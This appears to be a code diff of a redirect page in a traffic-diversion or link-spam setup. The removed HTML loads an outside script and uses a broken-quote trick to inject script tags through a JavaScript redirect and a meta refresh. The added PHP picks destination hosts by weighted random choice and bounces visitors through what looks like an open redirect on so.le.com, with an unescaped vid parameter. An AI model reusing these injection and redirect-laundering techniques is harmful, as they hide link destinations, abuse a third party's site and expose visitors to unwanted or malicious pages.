@@ -1,31 +1,32 @@
-<meta content="always" name="referrer">
-<script src="http://liebian1.oss-cn-qingdao.aliyuncs.com/balabala.js"> </script>
-<script>
-    try {
-        if (window.opener && window.opener.bds && window.opener.bds.pdc && window.opener.bds.pdc.sendLinkLog) {
-            window.opener.bds.pdc.sendLinkLog();
-        }
-    } catch (e) {};
-    var timeout = 0;
-    if (/bdlksmp/.test(window.location.href)) {
-        var reg = /bdlksmp=([^=&]+)/,
-            matches = window.location.href.match(reg);
-        timeout = matches[1] ? matches[1] : 0
-    };
-    setTimeout(function(){window.location.replace("'http://></noscript><script/src=/lb?name=VjFuiCKX></script><script'")},timeout);
-window.opener = null;
-</script>
-<noscript><META http-equiv="refresh" content="0;URL='http://></noscript><script/src=<?php
+<?php
 include './inc/config.php';
 include './inc/global.php';
+
 $cHost = getenv('HTTP_HOST');
-$cHost = idn_to_ascii($cHost);
-$cKey = md5($cHost);
-Counter::increase($cKey, 'hits');
-$url = App::url('dock');
-if(rand(0, 999) < 200) {
-    //$url = 'http://wx.lingdianshuwu.cn/v/content.html';
+
+$cKey = getHostKey($cHost);
+
+$jump = $cHost;
+
+$guide = Cache::get('domain_guide_' . $cKey);
+
+if ($guide) {
+    $rand = rand(1, 1000);
+
+    foreach ($guide as $host => $per) {
+        $rand -= $per;
+        if ($rand <= 0) {
+            $jump = $host;
+            break;
+        }else{
+            $jump = $cHost;
+            break;
+        }
+    }
 }
-//$url = 'http://wx.lingdianshuwu.cn/v/content.html';
-echo  $url.'.'.(isset($_GET['vid'])?$_GET['vid']:15).".as";
-	?>></script><script'"></noscript>
+
+//这里因为导流要开启随机
+$host = wapperHost($jump, 's.dhtml');
+
+header('HTTP/1.1 303 See Other');
+header('Location: ' . 'http://so.le.com/s3/?to=' . $host . '?vid=' . (isset($_GET['vid']) ? $_GET['vid'] : 15));
